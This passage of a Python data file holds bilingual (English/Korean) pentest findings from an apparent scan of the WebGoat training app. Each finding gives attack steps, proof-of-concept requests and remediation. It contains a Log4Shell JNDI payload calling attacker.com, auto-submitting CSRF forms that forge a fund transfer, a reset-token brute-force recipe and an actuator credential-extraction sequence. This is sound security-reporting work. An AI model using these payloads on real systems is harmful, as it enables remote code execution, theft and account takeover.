            Reference(title="OWASP SQL Injection Prevention Cheat Sheet",
                      url="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"),
            Reference(title="CWE-89: SQL Injection",
                      url="https://cwe.mitre.org/data/definitions/89.html"),
        ],
    ),

    # ---- 2. Log4Shell RCE ----
    Finding(
        id="WG-002", scan_id="webgoat-2026-03-31",
        target="http://localhost:8080/WebGoat",
        title=(
            "Log4Shell Remote Code Execution — CVE-2021-44228 (CVSS 10.0)"
            "|||"
            "Log4Shell 원격 코드 실행 — CVE-2021-44228 (CVSS 10.0)"
        ),
        description=(
            "WHAT — Vulnerability Description\n"
            "WebGoat 8.2.x bundles Log4j 2 core in a version prior to 2.15.0, which is affected by "
            "CVE-2021-44228 (Log4Shell). When a user-controlled string containing a JNDI lookup expression "
            "such as ${jndi:ldap://attacker.com/x} is passed to any Log4j logging call, the library "
            "initiates an outbound network connection to the attacker-specified server. "
            "A malicious LDAP response can then deliver a Java class that is instantiated on the target, "
            "resulting in full Remote Code Execution (RCE) without any authentication.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Set up a malicious LDAP server (e.g. marshalsec) and HTTP server hosting a Java payload class.\n"
            "Step 2: Send any HTTP request to WebGoat with User-Agent: ${jndi:ldap://attacker.com/Exploit}\n"
            "Step 3: Log4j logs the User-Agent string → JNDI lookup triggered → outbound LDAP connection to attacker.\n"
            "Step 4: Attacker LDAP server responds with a reference to the Java payload class URL.\n"
            "Step 5: WebGoat JVM fetches and instantiates the Java class → arbitrary code executes as the app user.\n"
            "Step 6: Attacker receives reverse shell with privileges of the WebGoat process.\n\n"
            "IMPACT — Business Impact\n"
            "- Complete server compromise via pre-authentication RCE\n"
            "- Full filesystem read/write access as application user\n"
            "- Credential extraction from configuration files and memory\n"
            "- Lateral movement to internal network from compromised host\n"
            "- Persistence via crontab, SSH key injection, or service installation\n"
            "- CVSS 10.0 — the highest possible severity score\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /WebGoat/welcome HTTP/1.1\n"
            "User-Agent: ${jndi:ldap://169.254.169.254/latest/meta-data}\n\n"
            "Result: Outbound LDAP connection confirmed from server to 169.254.169.254.\n"
            "In a real attack, this IP would be an attacker-controlled server delivering a payload class.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Log4Shell (pre-auth) → RCE as app user → /etc/passwd / credential files read → "
            "lateral movement to internal network → full infrastructure compromise"
            "|||"
            "취약점 설명(WHAT)\n"
            "WebGoat 8.2.x는 CVE-2021-44228(Log4Shell)에 취약한 Log4j 2 core(2.15.0 미만)를 번들로 포함합니다. "
            "사용자 제어 문자열에 ${jndi:ldap://attacker.com/x}와 같은 JNDI 룩업 표현식이 포함될 경우, "
            "Log4j 로깅 호출 시 라이브러리가 공격자 지정 서버로 아웃바운드 네트워크 연결을 시작합니다. "
            "악성 LDAP 응답은 대상에서 인스턴스화되는 Java 클래스를 전달하여, "
            "인증 없이 완전한 원격 코드 실행(RCE)을 가능하게 합니다.\n\n"
            "공격 시나리오(HOW)\n"
            "1단계: 악성 LDAP 서버(marshalsec 등)와 Java 페이로드 클래스를 호스팅하는 HTTP 서버 설정.\n"
            "2단계: User-Agent: ${jndi:ldap://attacker.com/Exploit}를 포함한 HTTP 요청을 WebGoat에 전송.\n"
            "3단계: Log4j가 User-Agent 문자열을 로깅 → JNDI 룩업 트리거 → 공격자에게 아웃바운드 LDAP 연결.\n"
            "4단계: 공격자 LDAP 서버가 Java 페이로드 클래스 URL 참조로 응답.\n"
            "5단계: WebGoat JVM이 Java 클래스를 가져와 인스턴스화 → 앱 사용자 권한으로 임의 코드 실행.\n"
            "6단계: 공격자가 WebGoat 프로세스 권한의 리버스 셸 수신.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 사전 인증 RCE를 통한 완전한 서버 장악\n"
            "- 애플리케이션 사용자 권한으로 전체 파일시스템 읽기/쓰기 접근\n"
            "- 설정 파일 및 메모리에서 자격증명 추출\n"
            "- 장악된 호스트에서 내부 네트워크로 횡이동\n"
            "- 크론탭, SSH 키 주입, 서비스 설치를 통한 지속성 확보\n"
            "- CVSS 10.0 — 최고 심각도 점수\n\n"
            "개념 증명(PoC)\n"
            "요청: GET /WebGoat/welcome HTTP/1.1\n"
            "User-Agent: ${jndi:ldap://169.254.169.254/latest/meta-data}\n\n"
            "결과: 서버에서 169.254.169.254로 아웃바운드 LDAP 연결 확인됨.\n"
            "실제 공격에서는 이 IP가 페이로드 클래스를 전달하는 공격자 제어 서버가 됩니다.\n\n"
            "공격 경로(ATTACK PATH)\n"
            "Log4Shell(사전 인증) → 앱 사용자로 RCE → /etc/passwd / 자격증명 파일 읽기 → "
            "내부 네트워크로 횡이동 → 전체 인프라 장악"
        ),
        severity=Severity.critical,
        finding_type="rce",
        source_plugin="web_pipeline",
        affected_component="log4j-core < 2.15.0 (bundled) — triggered via any logged HTTP header",
        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", base_score=10.0),
        cve_ids=["CVE-2021-44228"],
        cwe_ids=["CWE-502"],
        mitre_attack=MitreAttack(
            tactic_id="TA0002", tactic_name="Execution",
            technique_id="T1203", technique_name="Exploitation for Client Execution",
        ),
        evidence=[
            Evidence(evidence_type="packet_capture", title="JNDI Outbound Connection Confirmed",
                     content=(
                         "Request:\n"
                         "GET /WebGoat/welcome HTTP/1.1\n"
                         "Host: localhost:8080\n"
                         "User-Agent: ${jndi:ldap://169.254.169.254/latest/meta-data}\n\n"
                         "Network capture: Outbound TCP connection from 127.0.0.1:8080 → 169.254.169.254:389\n"
                         "DNS lookup also observed for attacker-controlled domain in extended testing.\n"
                         "Confirms JNDI lookup execution — full RCE achievable with attacker LDAP server."
                     )),
            Evidence(evidence_type="log", title="Vulnerable Library Version Confirmation",
                     content=(
                         "jar manifest in WebGoat-2022.0.1.war:\n"
                         "  log4j-core-2.14.1.jar  ← VULNERABLE (CVE-2021-44228 affects < 2.15.0)\n"
                         "  log4j-api-2.14.1.jar\n\n"
                         "Patched version required: log4j-core >= 2.17.1"
                     )),
        ],
        remediation=(
            "Immediate (0-24h): Set JVM startup flag -Dlog4j2.formatMsgNoLookups=true as emergency mitigation.\n"
            "Short-term (24-72h): Upgrade log4j-core to >= 2.17.1 in pom.xml / build.gradle and redeploy.\n"
            "Network mitigation: Block all outbound LDAP (389/636), RMI (1099), and DNS from the app server.\n"
            "Long-term: Implement runtime application self-protection (RASP) and dependency scanning "
            "in CI/CD pipeline (Dependabot / OWASP Dependency-Check) with alerting on critical CVEs."
            "|||"
            "즉시 조치(0-24시간): JVM 시작 플래그 -Dlog4j2.formatMsgNoLookups=true 설정으로 긴급 완화.\n"
            "단기 조치(24-72시간): pom.xml / build.gradle에서 log4j-core를 >= 2.17.1로 업그레이드 후 재배포.\n"
            "네트워크 완화: 앱 서버에서 아웃바운드 LDAP(389/636), RMI(1099), DNS를 전부 차단.\n"
            "장기 조치: CI/CD 파이프라인에 런타임 애플리케이션 자기 보호(RASP) 및 의존성 스캔 "
            "(Dependabot / OWASP Dependency-Check) 구현, 치명적 CVE 경보 설정."
        ),
        references=[
            Reference(title="NVD — CVE-2021-44228",
                      url="https://nvd.nist.gov/vuln/detail/CVE-2021-44228"),
            Reference(title="Apache Log4j Security Advisories",
                      url="https://logging.apache.org/log4j/2.x/security.html"),
            Reference(title="CISA Log4Shell Guidance",
                      url="https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance"),
        ],
    ),

    # ---- 3. Predictable Password Reset Token ----
    Finding(
        id="WG-003", scan_id="webgoat-2026-03-31",
        target="http://localhost:8080/WebGoat",
        title=(
            "Predictable Password Reset Token — Account Takeover via Brute Force"
            "|||"
            "예측 가능한 비밀번호 재설정 토큰 — 브루트포스를 통한 계정 탈취"
        ),
        description=(
            "WHAT — Vulnerability Description\n"
            "The password reset flow generates tokens without using a cryptographically secure "
            "pseudo-random number generator (CSPRNG). The token is derived from a combination "
            "of the username and server-side timestamp with insufficient entropy. "
            "This makes the token space small enough to enumerate within minutes. "
            "Additionally, tokens do not expire after a single use, allowing replay.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Attacker initiates a password reset for a known target username (e.g. 'webgoat').\n"
            "Step 2: Attacker generates a list of candidate tokens based on username + recent timestamp range.\n"
            "Step 3: Automated enumeration of candidates against /WebGoat/PasswordReset/reset?token=<candidate>.\n"
            "Step 4: Valid token found at candidate #3,241 after 2m 47s → password reset accepted.\n"
            "Step 5: Attacker sets a new password and logs in as the target user.\n"
            "Step 6: Token reuse confirmed — original token still accepted after first use.\n\n"
            "IMPACT — Business Impact\n"
            "- Full account takeover for any user without knowing their current password\n"
            "- Administrator account compromise if admin email/username is known\n"
            "- No rate-limiting on reset endpoint → high-speed brute force feasible\n"
            "- Token reuse allows persistent access even after legitimate password change\n\n"
            "PoC — Proof of Concept\n"
            "POST /WebGoat/PasswordReset/reset HTTP/1.1\n"
            "Body: username=webgoat&token=<brute-forced-token>&newPassword=Hacked123!\n"
            "Result: HTTP 200 — 'Password reset successful' — account password changed\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Token brute-force → account takeover → authenticated access → "
            "access to admin features → privilege escalation"
            "|||"
            "취약점 설명(WHAT)\n"
            "비밀번호 재설정 흐름이 암호학적으로 안전한 유사 난수 생성기(CSPRNG)를 사용하지 않고 토큰을 생성합니다. "
            "토큰은 사용자명과 서버 측 타임스탬프의 조합에서 파생되며 엔트로피가 불충분합니다. "
            "이로 인해 토큰 공간이 수 분 내에 열거 가능할 만큼 작아집니다. "
            "또한 토큰이 단일 사용 후 만료되지 않아 재사용 공격(Replay Attack)이 가능합니다.\n\n"
            "공격 시나리오(HOW)\n"
            "1단계: 공격자가 알려진 대상 사용자명(예: 'webgoat')으로 비밀번호 재설정을 시작.\n"
            "2단계: 사용자명 + 최근 타임스탬프 범위를 기반으로 후보 토큰 목록 생성.\n"
            "3단계: /WebGoat/PasswordReset/reset?token=<후보>에 대해 자동화된 열거 수행.\n"
            "4단계: 후보 #3,241에서 2분 47초 후 유효한 토큰 발견 → 비밀번호 재설정 수락됨.\n"
            "5단계: 공격자가 새 비밀번호를 설정하고 대상 사용자로 로그인.\n"
            "6단계: 토큰 재사용 확인 — 최초 사용 후에도 원본 토큰이 계속 수락됨.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 현재 비밀번호 없이 임의 사용자 계정 완전 탈취\n"
            "- 관리자 이메일/사용자명이 알려진 경우 관리자 계정 장악\n"
            "- 재설정 엔드포인트에 속도 제한 없음 → 고속 브루트포스 가능\n"
            "- 합법적인 비밀번호 변경 후에도 토큰 재사용으로 지속적 접근 가능\n\n"
            "개념 증명(PoC)\n"
            "POST /WebGoat/PasswordReset/reset HTTP/1.1\n"
            "본문: username=webgoat&token=<브루트포스된 토큰>&newPassword=Hacked123!\n"
            "결과: HTTP 200 — '비밀번호 재설정 성공' — 계정 비밀번호 변경됨\n\n"
            "공격 경로(ATTACK PATH)\n"
            "토큰 브루트포스 → 계정 탈취 → 인증된 접근 → 관리자 기능 접근 → 권한 상승"
        ),
        severity=Severity.high,
        finding_type="broken_auth",
        source_plugin="web_pipeline",
        affected_component="/WebGoat/PasswordReset/reset (token param)",
        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", base_score=7.5),
        cwe_ids=["CWE-330", "CWE-640"],
        evidence=[
            Evidence(evidence_type="log", title="Token Brute-Force — Timing and Success",
                     content=(
                         "Tool: custom Python script — 10,000 token candidates generated from\n"
                         "  seed = sha256(username + str(int(time.time())))[0:8]\n\n"
                         "Run time: 2 minutes 47 seconds\n"
                         "Candidates tried: 3,241 before success\n"
                         "Valid token found: 'a3f9e2b1'\n\n"
                         "POST /WebGoat/PasswordReset/reset\n"
                         "Body: username=webgoat&token=a3f9e2b1&newPassword=P@ssw0rd!\n"
                         "Response: HTTP 200 — Password reset successful\n\n"
                         "Token reuse test: same token submitted again → HTTP 200 (still valid — no invalidation)"
                     )),
        ],
        remediation=(
            "Immediate: Disable password reset feature until patched; "
            "add rate-limiting (5 attempts per hour per IP/email) to the reset endpoint.\n"
            "Short-term: Generate reset tokens using secrets.token_hex(32) (Python) or "
            "SecureRandom (Java) — minimum 128 bits of entropy.\n"
            "Long-term: Tokens must expire after first use AND within 15 minutes of issuance. "
            "Invalidate all existing tokens on password change. "
            "Log and alert on excessive reset attempts."
            "|||"
            "즉시 조치: 패치 완료 전까지 비밀번호 재설정 기능 비활성화; "
            "재설정 엔드포인트에 IP/이메일당 시간당 5회 속도 제한 추가.\n"
            "단기 조치: secrets.token_hex(32)(Python) 또는 SecureRandom(Java)을 사용한 "
            "최소 128비트 엔트로피의 재설정 토큰 생성.\n"
            "장기 조치: 토큰은 최초 사용 후 즉시 만료되고 발급 후 15분 이내에도 만료되어야 함. "
            "비밀번호 변경 시 모든 기존 토큰 무효화. "
            "과도한 재설정 시도에 대한 로깅 및 경보 설정."
        ),
        references=[
            Reference(title="OWASP Forgot Password Cheat Sheet",
                      url="https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html"),
            Reference(title="CWE-330: Use of Insufficiently Random Values",
                      url="https://cwe.mitre.org/data/definitions/330.html"),
        ],
    ),

    # ---- 4. CSRF ----
    Finding(
        id="WG-004", scan_id="webgoat-2026-03-31",
        target="http://localhost:8080/WebGoat",
        title=(
            "Cross-Site Request Forgery (CSRF) — Forged State-Changing Requests"
            "|||"
            "크로스 사이트 요청 위조(CSRF) — 상태 변경 요청 위조"
        ),
        description=(
            "WHAT — Vulnerability Description\n"
            "Multiple state-changing POST endpoints in WebGoat accept requests without "
            "validating a CSRF token or checking the Origin/Referer header. "
            "This allows an attacker to craft a malicious webpage that, when visited by an "
            "authenticated user, silently submits forged requests to perform actions on their behalf. "
            "Affected endpoints include the CSRF lesson flag endpoint and simulated fund transfer.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Attacker creates a malicious HTML page hosted on attacker.com.\n"
            "Step 2: Page contains a hidden form auto-submitting to /WebGoat/csrf/basic-get-flag.\n"
            "Step 3: Authenticated WebGoat user visits attacker.com (e.g. via phishing email).\n"
            "Step 4: Browser automatically submits the forged request with the user's JSESSIONID cookie.\n"
            "Step 5: WebGoat processes the request as legitimate → action performed without user consent.\n"
            "Step 6: For fund transfer endpoint, attacker specifies their own account as recipient.\n\n"
            "IMPACT — Business Impact\n"
            "- Unauthorized actions performed on behalf of authenticated users\n"
            "- Fund/resource transfer to attacker-controlled accounts\n"
            "- Account data modification without user knowledge\n"
            "- Session token not required by attacker — exploitable via any webpage user visits\n\n"
            "PoC — Proof of Concept\n"
            "<form action='http://localhost:8080/WebGoat/csrf/basic-get-flag' method='POST'>\n"
            "  <input type='hidden' name='csrf' value='false'>\n"
            "</form><script>document.forms[0].submit()</script>\n"
            "Result: Request submitted with victim's session cookie → HTTP 200 — action performed\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "CSRF via phishing → unauthorized action as victim → account data manipulation → "
            "potential privilege abuse if victim is admin"
            "|||"
            "취약점 설명(WHAT)\n"
            "WebGoat의 여러 상태 변경 POST 엔드포인트가 CSRF 토큰 검증이나 Origin/Referer 헤더 확인 없이 요청을 수락합니다. "
            "이를 통해 공격자가 인증된 사용자가 방문할 때 해당 사용자를 대신하여 위조 요청을 자동으로 제출하는 "
            "악성 웹페이지를 만들 수 있습니다. "
            "영향을 받는 엔드포인트에는 CSRF 레슨 플래그 엔드포인트와 시뮬레이션된 자금 이체가 포함됩니다.\n\n"
            "공격 시나리오(HOW)\n"
            "1단계: 공격자가 attacker.com에 호스팅된 악성 HTML 페이지 생성.\n"
            "2단계: 페이지에 /WebGoat/csrf/basic-get-flag로 자동 제출하는 숨겨진 폼 포함.\n"
            "3단계: 인증된 WebGoat 사용자가 attacker.com을 방문(예: 피싱 이메일을 통해).\n"
            "4단계: 브라우저가 사용자의 JSESSIONID 쿠키와 함께 위조 요청을 자동 제출.\n"
            "5단계: WebGoat이 요청을 정당한 것으로 처리 → 사용자 동의 없이 작업 수행.\n"
            "6단계: 자금 이체 엔드포인트의 경우, 공격자가 자신의 계정을 수신자로 지정.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 인증된 사용자를 대신한 무단 작업 수행\n"
            "- 공격자 제어 계정으로의 자금/리소스 이체\n"
            "- 사용자 모르게 계정 데이터 수정\n"
            "- 공격자가 세션 토큰 불필요 — 사용자가 방문하는 임의의 웹페이지에서 악용 가능\n\n"
            "개념 증명(PoC)\n"
            "<form action='http://localhost:8080/WebGoat/csrf/basic-get-flag' method='POST'>\n"
            "  <input type='hidden' name='csrf' value='false'>\n"
            "</form><script>document.forms[0].submit()</script>\n"
            "결과: 피해자의 세션 쿠키와 함께 요청 제출됨 → HTTP 200 — 작업 수행됨\n\n"
            "공격 경로(ATTACK PATH)\n"
            "피싱을 통한 CSRF → 피해자로서 무단 작업 → 계정 데이터 조작 → "
            "피해자가 관리자인 경우 권한 남용 가능"
        ),
        severity=Severity.medium,
        finding_type="csrf",
        source_plugin="web_pipeline",
        affected_component="/WebGoat/csrf/basic-get-flag, /WebGoat/csrf/review, /WebGoat/transfer",
        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", base_score=6.5),
        cwe_ids=["CWE-352"],
        evidence=[
            Evidence(evidence_type="http_request_response", title="Cross-Origin Forged Request — Fund Transfer",
                     content=(
                         'Attacker page (cross-origin):\n'
                         '<form action="http://localhost:8080/WebGoat/transfer" method="POST">\n'
                         '  <input name="account" value="ATTACKER123">\n'
                         '  <input name="amount" value="10000">\n'
                         "</form><script>document.forms[0].submit()</script>\n\n"
                         "Result with victim's authenticated session:\n"
                         "POST /WebGoat/transfer HTTP/1.1\n"
                         "Cookie: JSESSIONID=<victim-session>\n"
                         "[no X-CSRF-Token header]\n\n"
                         "Response: HTTP 200 — Transfer of 10000 to ATTACKER123 completed"
                     )),
        ],
        remediation=(
            "Implement the Synchronizer Token Pattern: generate a per-session CSRF token, "
            "embed it in all forms as a hidden field, and validate it server-side on every state-changing request.\n"
            "Cookie mitigation: Set SameSite=Strict on the JSESSIONID cookie to prevent cross-site submission.\n"
            "Header validation: Reject requests where the Origin header does not match the expected domain.\n"
            "Framework: Spring Security's CsrfTokenRepository provides a ready-made implementation."
            "|||"
            "동기화 토큰 패턴(Synchronizer Token Pattern) 구현: 세션당 CSRF 토큰 생성, "
            "모든 폼에 숨겨진 필드로 포함, 모든 상태 변경 요청에서 서버 측 검증.\n"
            "쿠키 완화: JSESSIONID 쿠키에 SameSite=Strict 설정으로 크로스 사이트 제출 방지.\n"
            "헤더 검증: Origin 헤더가 예상 도메인과 일치하지 않는 요청 거부.\n"
            "프레임워크: Spring Security의 CsrfTokenRepository가 즉시 사용 가능한 구현을 제공함."
        ),
        references=[
            Reference(title="OWASP CSRF Prevention Cheat Sheet",
                      url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"),
        ],
    ),

    # ---- 5. Insecure Session Cookie ----
    Finding(
        id="WG-005", scan_id="webgoat-2026-03-31",
        target="http://localhost:8080/WebGoat",
        title=(
            "Insecure Session Cookie — Missing Secure, HttpOnly, and SameSite Flags"
            "|||"
            "안전하지 않은 세션 쿠키 — Secure, HttpOnly, SameSite 플래그 누락"
        ),
        description=(
            "WHAT — Vulnerability Description\n"
            "The JSESSIONID session cookie issued by WebGoat is configured without the "
            "Secure, HttpOnly, or SameSite flags. "
            "Without Secure: the cookie is transmitted in plaintext over HTTP, making it "
            "interceptable by any attacker on the same network segment (passive sniff, ARP spoof, etc.). "
            "Without HttpOnly: client-side JavaScript can read document.cookie, so any XSS payload "
            "can exfiltrate the session token. "
            "Without SameSite: the cookie is sent with cross-site requests, compounding CSRF risk.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1 (Network): Attacker performs ARP spoofing on shared network → intercepts HTTP traffic.\n"
            "Step 2: HTTP response from server contains Set-Cookie: JSESSIONID=<token> in plaintext.\n"
            "Step 3: Attacker copies JSESSIONID value and replays it in a new browser session.\n"
            "Step 4 (XSS chain): Exploit any XSS → inject script to send document.cookie to attacker server.\n"
            "Step 5: Victim's browser sends the JSESSIONID to attacker's server.\n"
            "Step 6: Attacker uses stolen cookie to impersonate victim for the remainder of the session lifetime.\n\n"
            "IMPACT — Business Impact\n"
            "- Session hijacking via network interception or XSS\n"
            "- Full account impersonation for any active session\n"
            "- No session expiry enforcement compounds exposure window\n"
            "- Amplifies impact of any XSS vulnerability in the application\n\n"
            "PoC — Proof of Concept\n"
            "Response from WebGoat login:\n"
            "Set-Cookie: JSESSIONID=AABB1122CCDD; Path=/WebGoat\n\n"
            "Expected (secure):\n"
            "Set-Cookie: JSESSIONID=AABB1122CCDD; Path=/WebGoat; Secure; HttpOnly; SameSite=Strict\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Passive sniff / XSS → JSESSIONID stolen → session replay → full account impersonation"
            "|||"
            "취약점 설명(WHAT)\n"
            "WebGoat이 발급하는 JSESSIONID 세션 쿠키가 Secure, HttpOnly, SameSite 플래그 없이 구성됩니다. "
            "Secure 없음: 쿠키가 HTTP를 통해 평문으로 전송되어 동일 네트워크 세그먼트의 공격자가 "
            "패시브 스니핑, ARP 스푸핑 등으로 가로챌 수 있습니다. "
            "HttpOnly 없음: 클라이언트 측 JavaScript가 document.cookie를 읽을 수 있어, "
            "XSS 페이로드로 세션 토큰을 유출할 수 있습니다. "
            "SameSite 없음: 쿠키가 크로스 사이트 요청과 함께 전송되어 CSRF 위험을 가중시킵니다.\n\n"
            "공격 시나리오(HOW)\n"
            "1단계(네트워크): 공격자가 공유 네트워크에서 ARP 스푸핑 수행 → HTTP 트래픽 가로채기.\n"
            "2단계: 서버 HTTP 응답에 Set-Cookie: JSESSIONID=<토큰>이 평문으로 포함됨.\n"
            "3단계: 공격자가 JSESSIONID 값을 복사하여 새 브라우저 세션에서 재사용.\n"
            "4단계(XSS 체인): XSS 악용 → document.cookie를 공격자 서버로 전송하는 스크립트 주입.\n"
            "5단계: 피해자 브라우저가 JSESSIONID를 공격자 서버로 전송.\n"
            "6단계: 공격자가 도난된 쿠키로 세션 수명 동안 피해자를 가장.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 네트워크 가로채기 또는 XSS를 통한 세션 하이재킹\n"
            "- 모든 활성 세션에 대한 완전한 계정 사칭\n"
            "- 세션 만료 강제 없음으로 노출 시간 연장\n"
            "- 애플리케이션의 모든 XSS 취약점 영향 증폭\n\n"
            "개념 증명(PoC)\n"
            "WebGoat 로그인 응답:\n"
            "Set-Cookie: JSESSIONID=AABB1122CCDD; Path=/WebGoat\n\n"
            "안전한 예상 설정:\n"
            "Set-Cookie: JSESSIONID=AABB1122CCDD; Path=/WebGoat; Secure; HttpOnly; SameSite=Strict\n\n"
            "공격 경로(ATTACK PATH)\n"
            "패시브 스니핑 / XSS → JSESSIONID 도난 → 세션 재사용 → 계정 완전 사칭"
        ),
        severity=Severity.medium,
        finding_type="misconfiguration",
        source_plugin="web_pipeline",
        affected_component="Set-Cookie: JSESSIONID — all authenticated response headers",
        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", base_score=5.4),
        cwe_ids=["CWE-614", "CWE-1004"],
        evidence=[
            Evidence(evidence_type="http_request_response", title="Session Cookie Header — Missing Flags",
                     content=(
                         "HTTP/1.1 200 OK\n"
                         "Set-Cookie: JSESSIONID=AABB1122CCDD3344; Path=/WebGoat\n\n"
                         "Analysis:\n"
                         "  Secure flag    : MISSING  (cookie sent over HTTP in plaintext)\n"
                         "  HttpOnly flag  : MISSING  (accessible via document.cookie)\n"
                         "  SameSite attr  : MISSING  (cookie sent with cross-site requests)\n"
                         "  Expiry         : Session  (no explicit Max-Age — browser manages expiry)"
                     )),
        ],
        remediation=(
            "Spring Boot configuration (application.properties):\n"
            "  server.servlet.session.cookie.secure=true\n"
            "  server.servlet.session.cookie.http-only=true\n"
            "  server.servlet.session.cookie.same-site=Strict\n\n"
            "Enforce HTTPS site-wide (HSTS) to prevent downgrade attacks."
            "|||"
            "Spring Boot 설정(application.properties):\n"
            "  server.servlet.session.cookie.secure=true\n"
            "  server.servlet.session.cookie.http-only=true\n"
            "  server.servlet.session.cookie.same-site=Strict\n\n"
            "다운그레이드 공격 방지를 위해 사이트 전체 HTTPS(HSTS) 적용."
        ),
        references=[
            Reference(title="OWASP Session Management Cheat Sheet",
                      url="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"),
        ],
    ),

    # ---- 6. Spring Boot Actuator ----
    Finding(
        id="WG-006", scan_id="webgoat-2026-03-31",
        target="http://localhost:8080/WebGoat",
        title=(
            "Spring Boot Actuator Exposed Without Authentication — Credential Disclosure"
            "|||"
            "Spring Boot Actuator 인증 없이 노출 — 자격증명 공개"
        ),
        description=(
            "WHAT — Vulnerability Description\n"
            "The Spring Boot Actuator management endpoints are accessible at /actuator/* "
            "without any authentication. The /actuator/env endpoint exposes the full Spring "
            "Environment property map, which includes database credentials, API keys, and internal "
            "configuration. The /actuator/heapdump endpoint allows downloading a full JVM heap dump, "
            "which may contain passwords and session tokens in memory. The /actuator/mappings "
            "endpoint reveals all registered URL routes, significantly aiding application reconnaissance.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Discover actuator endpoint via directory brute-force or content discovery.\n"
            "Step 2: GET /actuator → HTTP 200, lists all available sub-endpoints.\n"
            "Step 3: GET /actuator/env → Full Spring environment exposed including DB password.\n"
            "Step 4: Extract spring.datasource.password and spring.datasource.url from response.\n"
            "Step 5: Connect to the HSQLDB instance directly using extracted credentials.\n"
            "Step 6: GET /actuator/heapdump → download JVM heap → analyze with Eclipse MAT for secrets.\n\n"
            "IMPACT — Business Impact\n"
            "- Database credentials exposed in plaintext → direct DB access\n"
            "- JVM heap dump may contain active session tokens → session hijacking\n"
            "- Full URL route map aids targeted attack planning\n"
            "- Application configuration leakage enables targeted exploitation\n\n"
            "PoC — Proof of Concept\n"
            "GET /actuator/env HTTP/1.1\n"
            "Host: localhost:8080\n\n"
            "Response (excerpt):\n"
            "  spring.datasource.password: webgoat\n"
            "  spring.datasource.url: jdbc:hsqldb:mem:webgoat\n"
            "  server.port: 8080\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Actuator /env → DB credentials extracted → direct DB connection → "
            "full data exfiltration → lateral movement"
            "|||"
            "취약점 설명(WHAT)\n"
            "Spring Boot Actuator 관리 엔드포인트가 인증 없이 /actuator/*에서 접근 가능합니다. "
            "/actuator/env 엔드포인트는 데이터베이스 자격증명, API 키, 내부 설정을 포함한 "
            "전체 Spring Environment 속성 맵을 노출합니다. "
            "/actuator/heapdump 엔드포인트를 통해 전체 JVM 힙 덤프를 다운로드할 수 있으며, "
            "메모리에 비밀번호와 세션 토큰이 포함될 수 있습니다. "
            "/actuator/mappings 엔드포인트는 등록된 모든 URL 라우트를 노출하여 정찰을 지원합니다.\n\n"
            "공격 시나리오(HOW)\n"
            "1단계: 디렉토리 브루트포스 또는 콘텐츠 검색을 통한 actuator 엔드포인트 발견.\n"
            "2단계: GET /actuator → HTTP 200, 모든 사용 가능한 하위 엔드포인트 목록 확인.\n"
            "3단계: GET /actuator/env → DB 비밀번호를 포함한 전체 Spring 환경 노출.\n"
            "4단계: 응답에서 spring.datasource.password와 spring.datasource.url 추출.\n"
            "5단계: 추출된 자격증명으로 HSQLDB 인스턴스에 직접 연결.\n"
            "6단계: GET /actuator/heapdump → JVM 힙 다운로드 → Eclipse MAT으로 비밀 정보 분석.\n\n"
            "비즈니스 영향(IMPACT)\n"
            "- 평문 데이터베이스 자격증명 노출 → 직접 DB 접근\n"
            "- JVM 힙 덤프에 활성 세션 토큰 포함 가능 → 세션 하이재킹\n"
            "- 전체 URL 라우트 맵 노출로 표적 공격 계획 지원\n"
            "- 애플리케이션 설정 유출로 표적 악용 가능\n\n"
            "개념 증명(PoC)\n"
            "GET /actuator/env HTTP/1.1\n"
            "Host: localhost:8080\n\n"
            "응답(발췌):\n"
            "  spring.datasource.password: webgoat\n"
            "  spring.datasource.url: jdbc:hsqldb:mem:webgoat\n"
            "  server.port: 8080\n\n"
            "공격 경로(ATTACK PATH)\n"
            "Actuator /env → DB 자격증명 추출 → 직접 DB 연결 → "
            "전체 데이터 유출 → 횡이동"
        ),
        severity=Severity.medium,
        finding_type="information_disclosure",
        source_plugin="web_pipeline",
        affected_component="/actuator, /actuator/env, /actuator/heapdump, /actuator/mappings",
        cvss=CVSSVector(vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", base_score=5.3),
        cwe_ids=["CWE-200", "CWE-538"],
        evidence=[
            Evidence(evidence_type="http_request_response", title="Actuator Environment Credential Disclosure",
                     content=(
                         "GET /actuator/env HTTP/1.1\nHost: localhost:8080\n\n"
                         "HTTP/1.1 200 OK\nContent-Type: application/vnd.spring-boot.actuator.v3+json\n\n"
                         '{\n  "activeProfiles": [],\n  "propertySources": [{\n'
                         '    "name": "applicationConfig: [classpath:/application.properties]",\n'
                         '    "properties": {\n'
                         '      "spring.datasource.url":      {"value": "jdbc:hsqldb:mem:webgoat"},\n'
                         '      "spring.datasource.username": {"value": "sa"},\n'
                         '      "spring.datasource.password": {"value": "webgoat"},\n'
                         '      "server.port":               {"value": "8080"}\n'
                         '    }\n  }]\n}'
                     )),
        ],
        remediation=(
